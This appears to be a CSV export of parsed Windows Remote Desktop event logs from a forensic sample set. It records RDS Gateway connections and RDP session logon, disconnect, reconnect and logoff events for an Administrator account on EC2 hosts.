82,82,2024-11-04 13:58:28.0284523,300,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2564,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User meets resource authorization policy requirements needed to connect to resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 met resource authorization policy requirements and was therefore authorized to connect to ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,,,ErrorCode: 0,"ConnectionProtocol: ","AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4020000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""ConnectionProtocol"":"""",""ErrorCode"":""0""}}}"
83,83,2024-11-04 13:58:28.0319644,302,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2564,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User connected to resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 connected to ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,,,ErrorCode: 0,ConnectionProtocol: HTTP,"AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""0""}}}"
84,84,2024-11-04 13:59:25.4316243,303,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User disconnected from resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 disconnected from ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,"Before EC2AMAZ-6C3C9U6\Administrator disconnected, the client transferred 241242 bytes and received 391624 bytes",The client session duration was 57 seconds,ErrorCode: 1226,ConnectionProtocol: HTTP,"AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""BytesReceived"":""391624"",""BytesTransfered"":""241242"",""SessionDuration"":""57"",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""1226""}}}"
85,85,2024-11-04 13:59:31.1919595,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63920 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63920""}}}"
86,86,2024-11-04 13:59:31.3792093,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63920 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63920""}}}"
87,87,2024-11-04 13:59:32.4005868,200,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User meets resource authorization policy requirements needed to connect to TS Gateway server,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 met resource authorization policy requirements and was therefore authorized to access the TS Gateway server,,,ErrorCode: 0,ConnectionProtocol: HTTP,AuthType: NTLM,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4020000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":""NTLM"",""Resource"":"""",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""0""}}}"
88,88,2024-11-04 13:59:32.6212995,300,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2556,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User meets resource authorization policy requirements needed to connect to resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 met resource authorization policy requirements and was therefore authorized to connect to ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,,,ErrorCode: 0,"ConnectionProtocol: ","AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4020000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""ConnectionProtocol"":"""",""ErrorCode"":""0""}}}"
89,89,2024-11-04 13:59:32.6243736,302,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2556,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User connected to resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 connected to ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,,,ErrorCode: 0,ConnectionProtocol: HTTP,"AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""0""}}}"
2262,2262,2024-11-14 03:22:50.7567375,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,952,EC2AMAZ-JET8PQL,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2263,2263,2024-11-14 03:22:50.7570148,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,952,EC2AMAZ-JET8PQL,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2264,2264,2024-11-14 03:22:50.7572505,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,952,EC2AMAZ-JET8PQL,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2265,2265,2024-11-14 03:23:10.6174382,54,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,4932,EC2AMAZ-JET8PQL,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2266,2266,2024-11-14 03:23:10.8516729,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,952,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2267,2267,2024-11-22 21:53:00.4081622,32,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,964,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""messageName"":""RDSAppXPlugin""}}}"
2268,2268,2024-11-22 21:53:00.4108461,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2269,2269,2024-11-22 21:53:00.4123603,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2270,2270,2024-11-22 21:53:00.4126543,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2271,2271,2024-11-22 21:53:00.4134804,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2272,2272,2024-11-22 21:53:00.4139932,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2273,2273,2024-11-22 21:53:04.6977916,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2274,2274,2024-11-22 21:53:04.6979987,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2275,2275,2024-11-22 21:53:04.7983551,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2276,2276,2024-11-22 21:53:04.7997466,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2277,2277,2024-11-22 21:53:05.7343396,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2278,2278,2024-11-22 21:53:43.5297395,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2279,2279,2024-11-22 21:53:47.5079710,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2280,2280,2024-11-22 21:53:49.7688182,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2281,2281,2024-11-22 21:53:49.8051987,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2282,2282,2024-11-22 21:53:49.8122846,54,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,376,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2283,2283,2024-11-22 21:54:15.1861994,32,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,924,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""messageName"":""RDSAppXPlugin""}}}"
2284,2284,2024-11-22 21:54:15.1889551,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2285,2285,2024-11-22 21:54:15.1902007,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2286,2286,2024-11-22 21:54:15.1904528,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2287,2287,2024-11-22 21:54:15.1910100,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2288,2288,2024-11-22 21:54:15.1913195,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2289,2289,2024-11-22 21:54:19.2956674,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2290,2290,2024-11-22 21:54:19.2958874,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2291,2291,2024-11-22 21:54:19.3626110,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2292,2292,2024-11-22 21:54:21.6979774,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2293,2293,2024-11-22 21:54:40.1994369,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2294,2294,2024-11-22 21:54:40.2420186,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2295,2295,2024-11-22 21:54:40.2454371,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2296,2296,2024-11-22 21:55:10.4399872,54,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,1200,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2297,2297,2024-11-22 22:30:38.9797626,32,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,552,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""messageName"":""RDSAppXPlugin""}}}"
2298,2298,2024-11-22 22:36:22.6415342,41,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2""}}}"
2299,2299,2024-11-22 22:36:22.6513945,42,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2""}}}"
2300,2300,2024-11-22 22:36:23.6347664,21,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logon succeeded,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
2301,2301,2024-11-22 22:36:24.3855711,22,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Shell start notification received,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
2302,2302,2024-11-22 22:37:00.9961072,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 2,Reason: No additional information is available (i.e. the user has closed RDP window),,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""2"",""Reason"":""0""}}}"
2303,2303,2024-11-22 22:37:06.7069807,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
2304,2304,2024-11-22 22:37:46.1843016,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,3592,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 2,Reason: The client's connection was replaced by another connection (i.e. a user reconnected to a previous RDP session),,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""2"",""Reason"":""5""}}}"
2305,2305,2024-11-22 22:37:46.9488957,25,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,3592,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session reconnection succeeded,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
2306,2306,2024-11-22 22:38:40.3691078,23,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,3480,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logoff succeeded,EC2AMAZ-3NFFVNI\Administrator,,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2""}}}"
2307,2307,2024-11-22 22:38:40.8849802,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 2,Reason: The disconnection was initiated by the user logging off his or her session on the server,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""2"",""Reason"":""12""}}}"
2308,2308,2024-11-22 22:38:40.9881075,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
